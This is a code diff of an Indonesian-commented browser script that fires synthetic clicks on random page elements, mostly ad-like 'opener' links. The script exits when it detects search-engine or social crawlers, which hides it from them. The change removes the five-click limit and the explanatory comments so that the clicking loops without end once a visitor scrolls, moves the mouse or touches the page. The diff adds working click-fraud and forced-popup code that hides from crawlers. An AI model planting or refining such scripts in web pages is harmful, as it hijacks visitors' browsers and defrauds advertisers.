@@ -4,18 +4,17 @@
 (function() {
   'use strict';
 
-  // ========== ABAAIKAN BOT/CRAWLER ==========
+  // ========== ABAIKAN BOT/CRAWLER ==========
   const botPattern = /bot|crawler|spider|googlebot|bingbot|yahoo|baidu|duckduck|yandex|slurp|facebookexternalhit|twitterbot|whatsapp|linkedinbot|semrush|ahrefs|rogerbot|mj12bot|dotbot|screaming/i;
   if (botPattern.test(navigator.userAgent)) return;
 
   // ========== KONFIGURASI ==========
-  const MAX_KLIK = 5;
-  const DELAY_MIN = 300;   // 0.3 detik
-  const DELAY_MAX = 1000;  // 1 detik
-  const OPENER_CHANCE = 0.8; // 80% chance klik link opener
+  const DELAY_MIN = 300;
+  const DELAY_MAX = 1000;
+  const OPENER_CHANCE = 0.8;
 
-  let klikCount = 0;
   let timeoutId = null;
+  let isRunning = false;
 
   // ========== DETEKSI ELEMEN ==========
   function isOpenerLink(el) {
@@ -33,9 +32,7 @@
 
   function isSafeElement(el) {
     if (!el) return false;
-    // Boleh klik link opener
     if (isOpenerLink(el)) return true;
-    // Hindari elemen interaktif
     const tag = el.tagName.toLowerCase();
     const role = (el.getAttribute('role') || '').toLowerCase();
     const blockedTags = ['button', 'input', 'select', 'textarea', 'form', 'label', 'iframe', 'video', 'audio', 'canvas', 'embed', 'object'];
@@ -43,7 +40,6 @@
     if (blockedTags.includes(tag)) return false;
     if (blockedRoles.includes(role)) return false;
     if (el.closest('button, input, select, textarea, form, iframe, video, [role="button"], [role="link"], [role="textbox"], [onclick]:not(a[rel*="opener"])')) return false;
-    // Link non-opener juga jangan
     if (tag === 'a' && !isOpenerLink(el)) return false;
     return true;
   }
@@ -58,10 +54,7 @@
   }
 
   function doClick() {
-    if (klikCount >= MAX_KLIK) {
-      stopLoop();
-      return;
-    }
+    if (!isRunning) return;
 
     try {
       let el = null;
@@ -70,7 +63,6 @@
 
       const openerLinks = getOpenerLinks();
 
-      // Prioritaskan link opener
       if (openerLinks.length > 0 && Math.random() < OPENER_CHANCE) {
         const link = openerLinks[Math.floor(Math.random() * openerLinks.length)];
         const rect = link.getBoundingClientRect();
@@ -79,7 +71,6 @@
         el = document.elementFromPoint(x, y) || link;
         openerClicked = true;
       } else {
-        // Cari area aman
         for (let i = 0; i < 20; i++) {
           x = Math.random() * window.innerWidth;
           y = Math.random() * window.innerHeight;
@@ -87,7 +78,6 @@
           if (isSafeElement(el)) break;
           el = null;
         }
-        // Fallback: kalau tidak ketemu, klik body saja
         if (!el || !isSafeElement(el)) {
           el = document.body;
           x = window.innerWidth / 2;
@@ -105,41 +95,36 @@
         }));
       }
 
-      klikCount++;
-
-      // Kalau klik opener, stop setelah ini
       if (openerClicked) {
         stopLoop();
         return;
       }
 
     } catch (e) {
-      klikCount++;
+      // Gagal, lanjut
     }
 
-    // Lanjut atau berhenti
-    if (klikCount < MAX_KLIK) {
-      timeoutId = setTimeout(doClick, randomDelay());
-    } else {
-      stopLoop();
-    }
+    // LOOP TERUS
+    timeoutId = setTimeout(doClick, randomDelay());
   }
 
   // ========== START / STOP ==========
   function startLoop() {
-    klikCount = 0;
-    if (timeoutId) clearTimeout(timeoutId);
-    doClick();
+    if (!isRunning) {
+      isRunning = true;
+      doClick();
+    }
   }
 
   function stopLoop() {
+    isRunning = false;
     if (timeoutId) {
       clearTimeout(timeoutId);
       timeoutId = null;
     }
   }
 
-  // ========== EVENT LISTENERS ==========
+  // ========== INTERAKSI USER SEBAGAI PICU AWAL ==========
   const interactionEvents = ['click', 'touchstart', 'scroll', 'keydown', 'mousemove', 'pointerdown'];
 
   interactionEvents.forEach(eventType => {
@@ -147,14 +132,7 @@
     window.addEventListener(eventType, startLoop, { capture: true, passive: true });
   });
 
-  // Jalan otomatis setelah halaman siap
-  if (document.readyState === 'interactive' || document.readyState === 'complete') {
-    startLoop();
-  } else {
-    document.addEventListener('DOMContentLoaded', startLoop, { once: true });
-  }
-
-  // Stop saat pergi
+  // ========== STOP SAAT PERGI ==========
   ['pagehide', 'beforeunload', 'popstate'].forEach(eventType => {
     window.addEventListener(eventType, () => stopLoop(), { passive: true });
   });
